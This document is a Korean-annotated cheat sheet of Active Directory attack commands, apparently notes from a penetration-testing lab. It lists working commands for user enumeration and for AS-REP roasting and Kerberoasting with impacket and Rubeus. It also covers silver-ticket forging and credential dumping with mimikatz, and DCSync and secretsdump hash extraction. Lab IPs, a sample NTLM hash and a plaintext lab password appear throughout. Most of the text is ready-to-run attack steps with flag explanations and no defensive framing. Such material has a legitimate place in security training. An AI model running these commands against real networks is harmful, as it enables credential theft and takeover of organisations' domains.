# Enumeration
```bash
netexec smb [ip] -u guest -p '' --rid-brute

./kerbrute_linux_amd64 userenum --dc 192.168.133.40 -d haero /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

---
# AS-REP Roasting
``` bash
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hash corp.com/pete
```

-   **-dc-ip** : 도메인 컨트롤러(DC)의 IP 주소를 지정.
-   **-request** : 실제로 AS-REP 요청을 보내 티켓을 가져옴.
-   **-outputfile** : 덤프한 해시를 저장할 파일 이름.
-   **corp.com/pete** : 대상 도메인/사용자 계정.

``` powershell
.\Rubeus.exe asreproast /nowrap
```

-   **asreproast** : AS-REP Roasting 공격 수행 모드.
-   **/nowrap** : 해시가 여러 줄로 나뉘지 않고 한 줄로 출력되도록 설정.
---
# Kerberoasting
``` powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

-   **kerberoast** : Kerberoasting 공격 수행 모드.
-   **/outfile** : 수집한 해시를 저장할 파일 지정.

``` bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

-   **-request** : SPN에 대해 실제 TGS 요청을 전송.
-   **-dc-ip** : 도메인 컨트롤러 IP.
-   **corp.com/pete** : 인증에 사용할 도메인/사용자.
---
# Silver Tickets
``` powershell
.\mimikatz.exe

privilege::debug

sekurlsa::logonpasswords

whoami /user

kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 '
/domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

klist

iwr -UseDefaultCredentials http://web04
```

-   **privilege::debug** : Mimikatz에서 SYSTEM 권한 디버그 권한 획득.
-   **sekurlsa::logonpasswords** : 현재 로그인된 세션에서 자격 증명
    덤프.
-   **whoami /user** : 현재 사용자 SID 확인.
-   **kerberos::golden** : 골든/실버 티켓 생성 명령.
    -   **/sid** : 도메인 SID 지정.
    -   **/domain** : 도메인 이름.
    -   **/ptt** : 생성한 티켓을 즉시 메모리에 삽입(Pass-the-Ticket).
    -   **/target** : 공격 대상 서비스 호스트.
    -   **/service** : 서비스 이름 (예: http, cifs 등).
    -   **/rc4** : 서비스 계정의 NTLM 해시.
    -   **/user** : 티켓에 삽입할 사용자 이름.
-   **klist** : 현재 메모리에 로드된 티켓 확인.
-   **iwr -UseDefaultCredentials** : 티켓을 이용해 웹 요청.
---
# Domain Controller Synchronization
``` powershell
.\mimikatz.exe

lsadump::dcsync /user:corp\Administrator
```

-   **lsadump::dcsync** : AD 복제 프로토콜을 악용하여 사용자 해시 요청.
-   **/user** : 대상 사용자 계정 지정.

``` bash
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023!"@192.168.50.70
```

-   **-just-dc-user** : 특정 사용자만 복제 요청.
-   **corp.com/jeffadmin** : 인증에 사용할 도메인/계정.
-   **패스워드** : 계정 암호.
-   **@192.168.50.70** : 도메인 컨트롤러 IP.
